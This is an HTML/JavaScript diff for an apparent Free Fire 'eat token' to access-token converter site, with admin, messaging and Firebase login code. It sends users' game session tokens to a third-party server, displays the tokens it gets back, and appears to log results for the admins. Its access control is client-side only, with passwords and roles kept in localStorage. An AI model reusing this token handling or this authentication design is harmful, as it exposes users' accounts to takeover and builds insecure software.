+            <input type="password" id="ownerNewPassword" class="cyber-input w-full rounded-xl py-2.5 px-3 pr-10 text-xs" placeholder="New Password" autocomplete="new-password" />
+            <button type="button" class="pw-toggle" onclick="toggleOwnerPassword('ownerNewPassword','ownerNewEye')"><i id="ownerNewEye" class="fas fa-eye"></i></button>
+          </div>
+          <div class="pw-wrap mb-3">
+            <input type="password" id="ownerConfirmPassword" class="cyber-input w-full rounded-xl py-2.5 px-3 pr-10 text-xs" placeholder="Confirm Password" autocomplete="new-password" />
+            <button type="button" class="pw-toggle" onclick="toggleOwnerPassword('ownerConfirmPassword','ownerConfirmEye')"><i id="ownerConfirmEye" class="fas fa-eye"></i></button>
+          </div>
+          <button onclick="changeOwnerPassword()" class="admin-edit-btn w-full py-2.5 rounded-lg text-xs font-bold transition">
+            <i class="fas fa-lock"></i> CHANGE PASSWORD
+          </button>
+        </div>
+
+        <!-- FOUR ADMIN OPTIONS -->
+        <div class="grid grid-cols-2 sm:grid-cols-4 gap-2 mb-4">
+          <button id="tabHistoryBtn" onclick="switchAdminTab('history')" class="tab-btn active text-[10px] font-bold py-2.5 rounded-lg tracking-wider uppercase"><i class="fas fa-history"></i> HISTORY</button>
+          <button id="tabMsgsBtn" onclick="switchAdminTab('msgs')" class="tab-btn text-[10px] font-bold py-2.5 rounded-lg tracking-wider uppercase"><i class="fas fa-envelope"></i> MESSAGES</button>
+          <button id="tabUsersBtn" onclick="switchAdminTab('users')" class="tab-btn text-[10px] font-bold py-2.5 rounded-lg tracking-wider uppercase"><i class="fas fa-users"></i> USER</button>
+          <button id="tabCreateBtn" onclick="switchAdminTab('create')" class="tab-btn text-[10px] font-bold py-2.5 rounded-lg tracking-wider uppercase"><i class="fas fa-user-plus"></i> CREATE ADMIN ID</button>
+        </div>
+
+        <!-- HISTORY -->
+        <div id="tabHistory">
+          <div class="flex justify-between items-center mb-3 border-b border-white/10 pb-2">
+            <h3 class="text-sm font-bold text-white uppercase tracking-wider">Player History</h3>
+            <button onclick="showDeleteUI('all_history')" class="del-btn text-[10px] font-bold px-3 py-1.5 rounded-lg transition"><i class="fas fa-trash"></i> DELETE ALL</button>
+          </div>
+          <div id="adminHistory" style="max-height:420px;overflow-y:auto;min-height:100px;">No data available</div>
+        </div>
+
+        <!-- MESSAGES -->
+        <div id="tabMsgs" class="hidden">
+          <div class="flex justify-between items-center mb-3 border-b border-white/10 pb-2">
+            <h3 class="text-sm font-bold text-white uppercase tracking-wider">Inbox</h3>
+            <button onclick="showDeleteUI('all_msgs')" class="del-btn text-[10px] font-bold px-3 py-1.5 rounded-lg transition"><i class="fas fa-trash"></i> DELETE ALL</button>
+          </div>
+          <div id="adminMsgs" style="max-height:420px;overflow-y:auto;min-height:100px;">No messages available</div>
+        </div>
+
+        <!-- USER -->
+        <div id="tabUsers" class="hidden">
+          <div class="flex justify-between items-center mb-3 border-b border-white/10 pb-2">
+            <h3 class="text-sm font-bold text-white uppercase tracking-wider">USER</h3>
+            <span id="userPermissionNote" class="text-[8px] text-gray-500 uppercase">Owner controls</span>
+          </div>
+          <div id="adminUsers" style="max-height:420px;overflow-y:auto;min-height:100px;">No users created</div>
+        </div>
+
+        <!-- CREATE ADMIN ID -->
+        <div id="tabCreate" class="hidden">
+          <div id="createAdminBox" class="bg-white/5 border rounded-xl p-4" style="border-color:rgba(60,139,195,.35);">
+            <div class="flex items-center gap-2 mb-3 border-b border-white/5 pb-2">
+              <i class="fas fa-user-plus" style="color:#3C8BC3;"></i>
+              <span class="text-xs font-bold text-white uppercase tracking-wider">CREATE ADMIN ID</span>
+            </div>
+            <div id="createAdminErr" class="hidden text-[10px] mb-2"></div>
+            <input type="text" id="caName" class="cyber-input w-full rounded-xl py-2.5 px-3 text-xs mb-2" placeholder="Name" autocomplete="off" minlength="8" />
+            <input type="text" id="caUser" class="cyber-input w-full rounded-xl py-2.5 px-3 text-xs mb-2" placeholder="Username (minimum 8 characters)" autocomplete="off" minlength="8" />
+            <div class="pw-wrap mb-2">
+              <input type="password" id="caPass" class="cyber-input w-full rounded-xl py-2.5 px-3 pr-10 text-xs" placeholder="Password (minimum 8 characters)" autocomplete="off" minlength="8" />
+              <button type="button" class="pw-toggle" onclick="togglePw2()"><i id="pwEye2" class="fas fa-eye"></i></button>
+            </div>
+            <div class="grid grid-cols-2 gap-2 mb-2">
+              <input type="number" id="caDuration" min="1" value="30" class="cyber-input w-full rounded-xl py-2.5 px-3 text-xs" placeholder="Duration" />
+              <select id="caUnit" class="cyber-input w-full rounded-xl py-2.5 px-3 text-xs">
+                <option value="minutes">Minutes</option>
+                <option value="hours">Hours</option>
+                <option value="days" selected>Days</option>
+              </select>
+            </div>
+            <select id="caCanCreate" class="cyber-input w-full rounded-xl py-2.5 px-3 text-xs mb-3">
+              <option value="no">Can this admin create other admin IDs? — NO</option>
+              <option value="yes">Can this admin create other admin IDs? — YES</option>
+            </select>
+            <button onclick="createAdminId()" class="admin-btn w-full py-2.5 rounded-lg text-white text-xs font-bold transition"><i class="fas fa-plus"></i> CREATE ADMIN ID</button>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ ADMIN PROFILE PAGE ============ -->
+  <div id="adminProfilePage">
+    <div class="w-full max-w-[480px]">
+      <div class="cyber-card p-6 sm:p-8">
+
+        <!-- BANNER + DP (CHANGE UI) -->
+        <div class="mb-6">
+          <div class="relative">
+            <img id="adminBannerImg" src="https://raw.githubusercontent.com/KillerSharmaBot/Eat-Token/refs/heads/main/image/YouTube.png" alt="Admin Banner" class="admin-banner" />
+            <button onclick="document.getElementById('bannerUpload').click()" class="upload-btn absolute top-2 right-2 text-[9px] font-bold px-2 py-1 rounded-lg">
+              <i class="fas fa-camera"></i> CHANGE BANNER
+            </button>
+            <input type="file" id="bannerUpload" accept="image/*" class="hidden" onchange="changeAdminImage(this,'banner')" />
+          </div>
+          <div class="flex flex-col items-center">
+            <div class="relative">
+              <img id="adminDpImg" src="https://avatars.githubusercontent.com/u/312629158?s=400&u=40d93dc807fa18e553bc1ac476d625471766150a&v=4" alt="Admin DP" class="admin-dp" />
+              <button onclick="document.getElementById('dpUpload').click()" class="upload-btn absolute bottom-0 right-0 w-6 h-6 rounded-full flex items-center justify-center" style="font-size:9px;" title="Change DP">
+                <i class="fas fa-camera"></i>
+              </button>
+              <input type="file" id="dpUpload" accept="image/*" class="hidden" onchange="changeAdminImage(this,'dp')" />
+            </div>
+            <h2 id="adminProfileName" class="text-xl font-bold title-font text-white mt-2" style="color:#F10E30;">
+              <i class="fas fa-user-shield"></i> Prime_4x
+            </h2>
+            <p id="adminProfileRole" class="text-[10px] text-gray-500 uppercase tracking-widest">Website Owner</p>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+  <!-- TERMS MODAL -->
+  <div id="termsModal" class="modal-overlay fixed inset-0 z-50 flex items-center justify-center p-4">
+    <div class="bg-[#0f0f13] border border-white/10 w-full max-w-sm rounded-2xl p-6 relative shadow-2xl">
+      <button onclick="closeModal('termsModal')" class="absolute top-4 right-4 text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
+      <h3 class="text-lg font-bold text-white mb-4 title-font uppercase tracking-widest text-center">Terms &amp; Conditions</h3>
+      <div class="text-xs text-gray-400 space-y-3 leading-relaxed font-light text-justify">
+        <p>This website does not store any sensitive details. We only store basic data to provide quality &amp; fast service.</p>
+        <p class="text-fuchsia-400"><strong>Disclaimer:</strong> Use this tool at your own risk. The developer is not responsible for any misuse.</p>
+        <p style="color: red;">Do not use these tokens to <strong>Violate Garena Terms &amp; Conditions</strong> and do not try any kind of automations</p>
+        <p>The Owner Of This Web Made This tool For Educational purpose for Devlopers</p>
+        <p>By using this website, you explicitly agree to our terms and conditions.</p>
+      </div>
+      <button onclick="closeModal('termsModal')" class="w-full mt-6 py-2.5 rounded-lg bg-white/5 hover:bg-white/10 text-white text-xs font-bold transition">I AGREE</button>
+    </div>
+  </div>
+
+  <!-- MESSAGE FOR ADMIN MODAL -->
+  <div id="messageModal" class="modal-overlay fixed inset-0 z-50 flex items-center justify-center p-4">
+    <div class="bg-[#0f0f13] border border-[#3C8BC3]/40 w-full max-w-sm rounded-2xl p-6 relative shadow-2xl">
+      <button onclick="closeModal('messageModal')" class="absolute top-4 right-4 text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
+      <h3 class="text-base font-bold text-white mb-4 title-font uppercase tracking-widest text-center" style="color:#3C8BC3;">
+        <i class="fas fa-envelope"></i> MESSAGE FOR ADMIN
+      </h3>
+      <div id="msgErr" class="hidden text-[10px] text-red-400 mb-2"></div>
+      <div class="p4x-ticket mb-3">
+        <div class="flex items-center justify-between gap-2">
+          <div>
+            <div class="text-[8px] text-gray-500 uppercase tracking-widest">Your Unique P4X Number</div>
+            <div id="msgP4XDisplay" class="text-sm font-black text-white mt-1 font-mono">P4X-------</div>
+          </div>
+          <button type="button" onclick="copyUserP4X()" class="text-[9px] px-2.5 py-1.5 rounded-lg" style="background:rgba(6,188,249,.12);border:1px solid rgba(6,188,249,.35);color:#06BCF9;">COPY</button>
+        </div>
+        <div class="text-[8px] text-gray-500 mt-1">Keep this P4X number. Use it to check your message status and Admin replies.</div>
+      </div>
+      <input type="text" id="msgName" class="cyber-input w-full rounded-xl py-2.5 px-3 text-xs mb-2" placeholder="Your Name / Nickname" autocomplete="off" />
+      <input type="text" id="msgSubject" class="cyber-input w-full rounded-xl py-2.5 px-3 text-xs mb-2" placeholder="Subject (Bug Issue, Help, Request...)" autocomplete="off" />
+      <textarea id="msgText" class="cyber-input w-full rounded-xl py-2.5 px-3 text-xs mb-2" rows="4" placeholder="Write your message to Admin..." style="resize:none;"></textarea>
+      <div class="flex items-center gap-2 mb-2">
+        <button onclick="document.getElementById('msgImgUpload').click()" class="upload-btn flex-1 text-[10px] font-bold py-2 rounded-lg">
+          <i class="fas fa-image"></i> <span id="msgImgLabel">ATTACH IMAGE</span>
+        </button>
+        <button id="msgImgClear" onclick="clearMsgImg()" class="del-btn hidden text-[10px] font-bold px-3 py-2 rounded-lg"><i class="fas fa-times"></i></button>
+      </div>
+      <input type="file" id="msgImgUpload" accept="image/*" class="hidden" onchange="previewMsgImg(this)" />
+      <img id="msgImgPreview" src="" class="msg-img hidden" alt="preview" />
+      <button onclick="sendMsgToAdmin()" class="btn-grad w-full rounded-xl py-2.5 mt-2 text-xs font-bold text-white tracking-wider">
+        <i class="fas fa-paper-plane"></i> SEND MESSAGE
+      </button>
+      <button onclick="showMyReplies()" class="w-full rounded-xl py-2.5 mt-2 text-xs font-bold text-white tracking-wider" style="background:rgba(16,185,129,0.2);border:1px solid #10b981;">
+        <i class="fas fa-inbox"></i> MY REPLIES
+      </button>
+    </div>
+  </div>
+
+  <!-- OWNER EDIT ADMIN CREDENTIALS MODAL -->
+  <div id="editAdminModal" class="modal-overlay fixed inset-0 z-50 flex items-center justify-center p-4">
+    <div class="bg-[#0f0f13] border border-[#06BCF9]/40 w-full max-w-sm rounded-2xl p-6 relative shadow-2xl">
+      <button onclick="closeModal('editAdminModal')" class="absolute top-4 right-4 text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
+      <h3 class="text-base font-bold text-white mb-4 title-font uppercase tracking-widest text-center" style="color:#06BCF9;">
+        <i class="fas fa-user-pen"></i> EDIT ADMIN USER
+      </h3>
+      <div id="editAdminErr" class="hidden text-[10px] mb-2"></div>
+      <input type="hidden" id="editAdminId" />
+      <input type="text" id="editAdminName" class="cyber-input w-full rounded-xl py-2.5 px-3 text-xs mb-2" placeholder="Name" autocomplete="off" />
+      <input type="text" id="editAdminUser" class="cyber-input w-full rounded-xl py-2.5 px-3 text-xs mb-2" placeholder="Firebase Email" autocomplete="username" />
+      <input type="password" id="editAdminPass" class="cyber-input w-full rounded-xl py-2.5 px-3 text-xs mb-2" placeholder="New Password" autocomplete="off" />
+      <input type="number" id="editAdminDuration" min="1" class="cyber-input w-full rounded-xl py-2.5 px-3 text-xs mb-2" placeholder="Duration (days)" />
+      <select id="editAdminUnit" class="cyber-input w-full rounded-xl py-2.5 px-3 text-xs mb-2"><option value="minutes">Minutes</option><option value="hours">Hours</option><option value="days" selected>Days</option></select>
+      <select id="editAdminCanCreate" class="cyber-input w-full rounded-xl py-2.5 px-3 text-xs mb-3">
+        <option value="no">Can create other admin IDs — NO</option>
+        <option value="yes">Can create other admin IDs — YES</option>
+      </select>
+      <button onclick="saveAdminEdit()" class="admin-edit-btn w-full py-2.5 rounded-lg text-xs font-bold transition">SAVE CHANGES</button>
+    </div>
+  </div>
+
+  <!-- ADMIN LOGIN MODAL -->
+  <div id="adminLoginModal" class="modal-overlay fixed inset-0 z-50 flex items-center justify-center p-4">
+    <div class="login-card bg-[#0f0f13] w-full max-w-sm rounded-2xl p-6 relative shadow-2xl">
+      <button onclick="closeModal('adminLoginModal')" class="absolute top-4 right-4 text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
+      <div class="text-center mb-4">
+        <div class="mx-auto w-14 h-14 rounded-full flex items-center justify-center mb-3" style="background:rgba(60,139,195,.12);border:1px solid rgba(60,139,195,.5);box-shadow:0 0 25px rgba(60,139,195,.2);">
+          <i class="fas fa-user-shield text-xl login-icon"></i>
+        </div>
+        <h3 class="text-lg font-bold text-white title-font uppercase tracking-widest">Admin Login</h3>
+        <p class="text-[9px] text-gray-500 mt-1 uppercase tracking-widest">Authorized access only</p>
+      </div>
+      <div id="adminErr" class="hidden text-[11px] text-red-400 text-center mb-3"></div>
+      <input type="email" id="adminUser" class="login-input cyber-input w-full rounded-xl py-3 px-4 text-sm mb-3" placeholder="Firebase Authentication Email" autocomplete="username" />
+      <div class="pw-wrap mb-4">
+        <input type="password" id="adminPass" class="login-input cyber-input w-full rounded-xl py-3 px-4 pr-10 text-sm" placeholder="Firebase Password" autocomplete="current-password" />
+        <button type="button" class="pw-toggle" onclick="togglePw()"><i id="pwEye" class="fas fa-eye"></i></button>
+      </div>
+      <button onclick="adminLogin()" class="admin-btn w-full py-2.5 rounded-lg text-white text-xs font-bold transition">LOGIN</button>
+    </div>
+  </div>
+
+  <!-- DELETE CONFIRM UI -->
+  <div id="deleteModal" class="modal-overlay fixed inset-0 z-50 flex items-center justify-center p-4">
+    <div class="bg-[#0f0f13] border border-[#F10E30]/50 w-full max-w-xs rounded-2xl p-6 relative shadow-2xl text-center animate-in">
+      <div class="w-14 h-14 mx-auto mb-3 rounded-full flex items-center justify-center" style="background:rgba(241,14,48,0.15);border:1px solid #F10E30;">
+        <i class="fas fa-trash text-xl" style="color:#F10E30;"></i>
+      </div>
+      <h3 class="text-base font-bold text-white mb-2 title-font uppercase tracking-widest">Delete confirmation</h3>
+      <p id="deleteMsg" class="text-[11px] text-gray-400 mb-5">Are you sure?</p>
+      <div class="grid grid-cols-2 gap-2">
+        <button onclick="closeModal('deleteModal')" class="py-2.5 rounded-lg bg-white/5 hover:bg-white/10 text-white text-xs font-bold transition">CANCEL</button>
+        <button onclick="confirmDelete()" class="del-btn py-2.5 rounded-lg text-xs font-bold transition">YES, DELETE</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- MY REPLIES MODAL -->
+  <div id="myRepliesModal" class="modal-overlay fixed inset-0 z-50 flex items-center justify-center p-4">
+    <div class="bg-[#0f0f13] border border-[#10b981]/40 w-full max-w-sm rounded-2xl p-6 relative shadow-2xl">
+      <button onclick="closeModal('myRepliesModal')" class="absolute top-4 right-4 text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
+      <h3 class="text-base font-bold text-white mb-4 title-font uppercase tracking-widest text-center" style="color:#10b981;">
+        <i class="fas fa-inbox"></i> P4X STATUS / ADMIN REPLY
+      </h3>
+      <input type="text" id="replyNameInp" class="cyber-input w-full rounded-xl py-2.5 px-3 text-xs mb-3" placeholder="Enter your P4X Number (e.g. P4X-ABC123)" autocomplete="off" />
+      <div id="myRepliesBox" class="scroll-box-large" style="max-height:250px;border-left-color:#10b981;">Enter your name and press CHECK REPLIES...</div>
+      <button onclick="loadMyReplies()" class="w-full mt-4 py-2.5 rounded-lg text-white text-xs font-bold transition" style="background:#10b981;">CHECK STATUS</button>
+    </div>
+  </div>
+
+  <!-- ADMIN REPLY MODAL -->
+  <div id="replyModal" class="modal-overlay fixed inset-0 z-50 flex items-center justify-center p-4">
+    <div class="bg-[#0f0f13] border border-[#F10E30]/40 w-full max-w-sm rounded-2xl p-6 relative shadow-2xl">
+      <button onclick="closeModal('replyModal')" class="absolute top-4 right-4 text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
+      <h3 class="text-base font-bold text-white mb-1 title-font uppercase tracking-widest text-center" style="color:#F10E30;">
+        <i class="fas fa-reply"></i> Reply to <span id="replyToName"></span>
+      </h3>
+      <p id="replyOrigMsg" class="text-[10px] text-gray-400 text-center mb-3 bg-white/5 rounded-lg p-2"></p>
+      <textarea id="replyText" class="cyber-input w-full rounded-xl py-2.5 px-3 text-xs mb-3" rows="3" placeholder="Type your reply..." style="resize:none;"></textarea>
+      <button onclick="sendReply()" class="admin-btn w-full py-2.5 rounded-lg text-white text-xs font-bold transition">SEND REPLY</button>
+    </div>
+  </div>
+
+  <script src="https://www.gstatic.com/firebasejs/10.12.5/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.5/firebase-auth-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.5/firebase-database-compat.js"></script>
+  <script>
+    /* ================= MAIN TOOL ================= */
+    let currentResponseData=null;
+    const tokenInp=document.getElementById('tokenInp');
+    const clearBtn=document.getElementById('clearBtn');
+    tokenInp.addEventListener('input',function(){if(tokenInp.value.length===0){clearBtn.classList.add('hidden');}else{clearBtn.classList.remove('hidden');}});
+    function clearInput(){tokenInp.value='';clearBtn.classList.add('hidden');tokenInp.focus();}
+    tokenInp.addEventListener("keypress",function(event){if(event.key==="Enter"){event.preventDefault();processToken();}});
+
+    function extractEatToken(input){
+      if(input.includes('eat=')){
+        const match=input.match(/[?&]eat=([^&]+)/);
+        if(match&&match[1]){return match[1];}
+      }
+      return input;
+    }
+
+    function copyAccessTokenOnly(){
+      if(currentResponseData&&currentResponseData.access_token){
+        copyToClipboard(currentResponseData.access_token,document.getElementById('copyTokenBtn'),'TOKEN COPIED!');
+      }else{
+        const d=document.getElementById('accessTokenDisplay');
+        if(d&&d.innerText!=='-'&&d.innerText!=='--'&&d.innerText!=='No access_token field in response'){
+          copyToClipboard(d.innerText,document.getElementById('copyTokenBtn'),'TOKEN COPIED!');
+        }else{alert('No access token available to copy');}
+      }
+    }
+    function copyJwtTokenOnly(){
+      if(currentResponseData&&currentResponseData.token){
+        copyToClipboard(currentResponseData.token,document.getElementById('copyJwtBtn'),'JWT COPIED!');
+      }else{alert('No JWT token available to copy');}
+    }
+    function copyFullResponse(){
+      const r=document.getElementById('apiResponseDisplay').innerText;
+      if(r&&r!=="Waiting for response..."){
+        copyToClipboard(r,document.getElementById('copyFullResponseBtn'),'FULL RESPONSE COPIED!');
+      }else{alert('No response data to copy');}
+    }
+    function copyToClipboard(text,btn,sm){
+      if(!text)return;
+      if(navigator.clipboard&&navigator.clipboard.writeText){
+        navigator.clipboard.writeText(text).then(()=>{showCopyFeedback(btn,sm);}).catch(()=>{fallbackCopy(text,btn,sm);});
+      }else{fallbackCopy(text,btn,sm);}
+    }
+    function fallbackCopy(text,btn,sm){
+      const ta=document.createElement('textarea');
+      ta.value=text;ta.style.position='fixed';ta.style.opacity='0';
+      document.body.appendChild(ta);ta.select();ta.setSelectionRange(0,99999);
+      document.execCommand('copy');document.body.removeChild(ta);
+      showCopyFeedback(btn,sm);
+    }
+    function showCopyFeedback(btn,msg){
+      const o=btn.innerHTML;
+      btn.innerHTML=`<i class="fas fa-check text-[10px]"></i> ${msg}`;
+      btn.classList.add('copy-btn-success');
+      setTimeout(()=>{btn.innerHTML=o;btn.classList.remove('copy-btn-success');},2000);
+    }
+
+    async function processToken(){
+      const input=tokenInp.value.trim();
+      const btn=document.getElementById('btn');
+      const out=document.getElementById('output');
+      const errBox=document.getElementById('error-box');
+      const errorTitle=document.getElementById('error-title');
+      const errorMessage=document.getElementById('error-message');
+      out.classList.add('hidden');errBox.classList.add('hidden');
+      document.getElementById('bannerContainer').classList.add('hidden');
+      document.getElementById('jwtContainer').classList.add('hidden');
+      currentResponseData=null;
+      if(!input){tokenInp.focus();return;}
+      const eatToken=extractEatToken(input);
+      if(!eatToken){
+        errorTitle.innerText='Invalid Input';
+        errorMessage.innerText='Please provide a valid URL or eat token.';
+        errBox.classList.remove('hidden');return;
+      }
+      btn.innerHTML='<i class="fas fa-spinner fa-spin"></i> GENERATING...';btn.disabled=true;
+      const apiUrl=`https://access.killersharmabot.online/access?access_token=${encodeURIComponent(eatToken)}`;
+      try{
+        const response=await fetch(apiUrl,{method:'GET',headers:{'Accept':'application/json'}});
+        const text=await response.text();
+        let result;
+        try{result=JSON.parse(text);}catch(e){result={error:'Invalid JSON response',raw:text};}
+        currentResponseData=result;
+        document.getElementById('apiResponseDisplay').innerText=JSON.stringify(result,null,2);
+        const extractedToken=result.access_token||null;
+        if(extractedToken){document.getElementById('accessTokenDisplay').innerText=extractedToken;}
+        else{document.getElementById('accessTokenDisplay').innerText='No access_token field in response';}
+        const jwtToken=result.token||null;
+        if(jwtToken){document.getElementById('jwtTokenDisplay').innerText=jwtToken;document.getElementById('jwtContainer').classList.remove('hidden');}
+        if(result.error=="Check Your access Token"){
+          errorTitle.innerText='Invalid Token';
+          errorMessage.innerText='Your access token or eat token is invalid. Please login again to get a new token.';
+          errBox.classList.remove('hidden');
+          btn.innerHTML='GENERATE ACCESS <i class="fas fa-arrow-right text-xs"></i>';btn.disabled=false;return;
+        }
+        if(result.error&&result.error.includes("Failed to extract")){
+          errorTitle.innerText='Invalid Token';
+          errorMessage.innerText='Wrong or expired eat token. Please login again.';
+          errBox.classList.remove('hidden');
+          btn.innerHTML='GENERATE ACCESS <i class="fas fa-arrow-right text-xs"></i>';btn.disabled=false;return;
+        }
+        if(result.nickname){document.getElementById('nick').innerText=result.nickname;}
+        else if(result.accountId){document.getElementById('nick').innerText='User '+result.accountId;}
+        if(result.lockRegion){document.getElementById('reg').innerText=result.lockRegion;}
+        else if(result.noti_region){document.getElementById('reg').innerText=result.noti_region;}
+        else if(result.region){document.getElementById('reg').innerText=result.region;}
+        if(result.accountId){document.getElementById('aid').innerText=result.accountId;}
+        else if(result.account_id){document.getElementById('aid').innerText=result.account_id;}
+        else if(result.uid){document.getElementById('aid').innerText=result.uid;}
+        if(result.level){document.getElementById('level').innerText=result.level;}
+        const bannerUrl=buildBannerUrl(result);
+        if(bannerUrl){
+          const bannerImage=document.getElementById('bannerImage');
+          const bannerContainer=document.getElementById('bannerContainer');
+          bannerImage.onerror=function(){
+            bannerContainer.classList.add('hidden');
+          };
+          bannerImage.onload=function(){bannerContainer.classList.remove('hidden');};
+          bannerImage.src=bannerUrl;
+        }
+        if(!result.error){saveHistory(result);}
+        out.classList.remove('hidden');
+      }catch(error){
+        console.error('Fetch error:',error);
+        errorTitle.innerText='Network Error';
+        errorMessage.innerText='Failed to connect to API. Please try again.';
+        errBox.classList.remove('hidden');
+      }
+      btn.innerHTML='GENERATE ACCESS <i class="fas fa-arrow-right text-xs"></i>';btn.disabled=false;
+    }
+
+    /* ================= MODALS ================= */
+    function openModal(id){const el=document.getElementById(id);if(el)el.classList.add('active');}
+    function closeModal(id){const el=document.getElementById(id);if(el)el.classList.remove('active');}
+    document.querySelectorAll('.modal-overlay').forEach(m=>{
+      m.addEventListener('click',function(e){if(e.target===this){this.classList.remove('active');}});
+    });
+
+    /* ================= ADMIN SYSTEM ================= */
+    const OWNER={name:'Prime 4x',user:'Prime_4x',pass:localStorage.getItem('prime4x_owner_password')||''};
+
+    // ===== FIREBASE AUTH (ADMIN LOGIN) =====
+    const firebaseConfig = {
+      apiKey: "AIzaSyBkNvWuRVwwk98xj70BfUbEwoUVSnjwBec",
+      authDomain: "primeaccess-ce810.firebaseapp.com",
+      databaseURL: "https://primeaccess-ce810-default-rtdb.firebaseio.com/",
+      projectId: "primeaccess-ce810",
+      storageBucket: "primeaccess-ce810.firebasestorage.app",
+      messagingSenderId: "6933705412",
+      appId: "1:6933705412:web:27a8c9a588ebb9bb07cf91",
+      measurementId: "G-5X3FGN17GX"
+    };
+    if(!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+    const firebaseAuth = firebase.auth();
+    const firebaseDB = firebase.database();
+    let isAdmin=false;
+    let currentAdmin=null;
+
+    function getAdminIds(){
+      try{return JSON.parse(localStorage.getItem('ff_admin_ids')||'[]');}catch(e){return [];}
+    }
+    function saveAdminIds(ids){localStorage.setItem('ff_admin_ids',JSON.stringify(ids));}
+    function isOwner(){return !!currentAdmin&&currentAdmin.role==='owner';}
+    function canCreateAdmin(){return isOwner()||!!currentAdmin&&currentAdmin.canCreateAdmin===true;}
+
+    function toggleOwnerPassword(inputId,eyeId){
+      const input=document.getElementById(inputId);
+      const eye=document.getElementById(eyeId);
+      if(!input||!eye)return;
+      if(input.type==='password'){input.type='text';eye.className='fas fa-eye-slash';}
+      else{input.type='password';eye.className='fas fa-eye';}
+    }
+
+    function updateOwnerPasswordUI(){
+      const box=document.getElementById('ownerPasswordBox');
+      if(box)box.classList.toggle('hidden',!isOwner());
+    }
+
+    function changeOwnerPassword(){
+      if(!isOwner())return;
+      const oldPass=document.getElementById('ownerOldPassword').value;
+      const newPass=document.getElementById('ownerNewPassword').value;
+      const confirmPass=document.getElementById('ownerConfirmPassword').value;
+      const msg=document.getElementById('ownerPasswordMsg');
+      msg.classList.remove('hidden');
+      msg.style.color='#F10E30';
+      if(oldPass!==OWNER.pass){msg.innerText='❌ Old Password is incorrect.';return;}
+      if(newPass.length<8){msg.innerText='❌ New Password must be at least 8 characters.';return;}
+      if(newPass!==confirmPass){msg.innerText='❌ New Password and Confirm Password do not match.';return;}
+      if(newPass===oldPass){msg.innerText='❌ New Password must be different from Old Password.';return;}
+      localStorage.setItem('prime4x_owner_password',newPass);
+      OWNER.pass=newPass;
+      document.getElementById('ownerOldPassword').value='';
+      document.getElementById('ownerNewPassword').value='';
+      document.getElementById('ownerConfirmPassword').value='';
+      msg.style.color='#10b981';
+      msg.innerText='Congratulations! Your password has changed';
+      setTimeout(()=>{msg.classList.add('hidden');},3500);
+    }
+
+    function togglePw(){
+      const pw=document.getElementById('adminPass');
+      const eye=document.getElementById('pwEye');
+      if(pw.type==='password'){pw.type='text';eye.className='fas fa-eye-slash';}
+      else{pw.type='password';eye.className='fas fa-eye';}
+    }
+    function togglePw2(){
+      const pw=document.getElementById('caPass');
+      const eye=document.getElementById('pwEye2');
+      if(pw.type==='password'){pw.type='text';eye.className='fas fa-eye-slash';}
+      else{pw.type='password';eye.className='fas fa-eye';}
+    }
+
+    function speakAdminWelcome(){
+      try{
+        if(!('speechSynthesis' in window)) return;
+        window.speechSynthesis.cancel();
+        const msg=new SpeechSynthesisUtterance('Welcome boss');
+        msg.lang='en-US';
+        msg.rate=0.95;
+        msg.pitch=1.0;
+        msg.volume=1;
+        window.speechSynthesis.speak(msg);
+      }catch(e){}
+    }
+
+    function updateAdminTabAccess(){
+      const usersBtn=document.getElementById('tabUsersBtn');
+      if(!usersBtn)return;
+      const owner=isAdmin && currentAdmin && currentAdmin.role==='owner';
+      usersBtn.style.display=owner?'':'none';
+      if(!owner && document.getElementById('tabUsers') && !document.getElementById('tabUsers').classList.contains('hidden')){
+        switchAdminTab('history');
+      }
+    }
+
+    async function adminLogin(){
+      const email=document.getElementById('adminUser').value.trim();
+      const p=document.getElementById('adminPass').value;
+      const err=document.getElementById('adminErr');
+      err.classList.remove('hidden');
+      err.style.color='#F10E30';
+      err.innerText='Checking Firebase login...';
+
+      if(!email || !p){
+        err.innerText='❌ Enter your Firebase Authentication email and password.';
+        return;
+      }
+
+      const loginBtn=document.querySelector('#adminLoginModal button[onclick="adminLogin()"]');
+      if(loginBtn)loginBtn.disabled=true;
+      try{
+        const cred=await firebaseAuth.signInWithEmailAndPassword(email,p);
+        const user=cred.user;
+        if(!user || !user.email){
+          throw new Error('Firebase returned no authenticated user.');
+        }
+
+        err.classList.add('hidden');
+        document.getElementById('adminUser').value='';
+        document.getElementById('adminPass').value='';
+        closeModal('adminLoginModal');
+
+        isAdmin=true;
+        currentAdmin={
+          name:'Prime 4x',
+          user:user.email,
+          email:user.email,
+          uid:user.uid,
+          role:'owner',
+          canCreateAdmin:true,
+          firebaseAuth:true
+        };
+        updateHomeAdminState();
+        updateAdminTabAccess();
+        updateOwnerPasswordUI();
+        setTimeout(speakAdminWelcome,250);
+
+        const dp=localStorage.getItem('ff_admin_dp');
+        const wb=document.getElementById('welcomeBoss');
+        document.getElementById('welcomeDp').src=dp||'https://avatars.githubusercontent.com/u/312629158?s=400&u=40d93dc807fa18e553bc1ac476d625471766150a&v=4';
+        wb.querySelector('h1').innerText='WELCOME BOSS';
+        const tick=document.getElementById('ownerVerifiedTick');
+        if(tick)tick.classList.remove('hidden');
+        wb.classList.add('show');
+        history.pushState({admin:true},'','#admin');
+        setTimeout(()=>{wb.classList.remove('show');openAdminPanel();},1800);
+      }catch(e){
+        console.error('Firebase Admin Login:',e);
+        const code=e && e.code ? e.code : 'unknown';
+        const messages={
+          'auth/invalid-credential':'❌ Invalid Firebase email or password.',
+          'auth/invalid-email':'❌ The Firebase email address is invalid.',
+          'auth/user-not-found':'❌ No Firebase Authentication user exists with this email.',
+          'auth/wrong-password':'❌ Firebase password is incorrect.',
+          'auth/user-disabled':'❌ This Firebase Authentication user is disabled.',
+          'auth/too-many-requests':'❌ Too many login attempts. Try again later.',
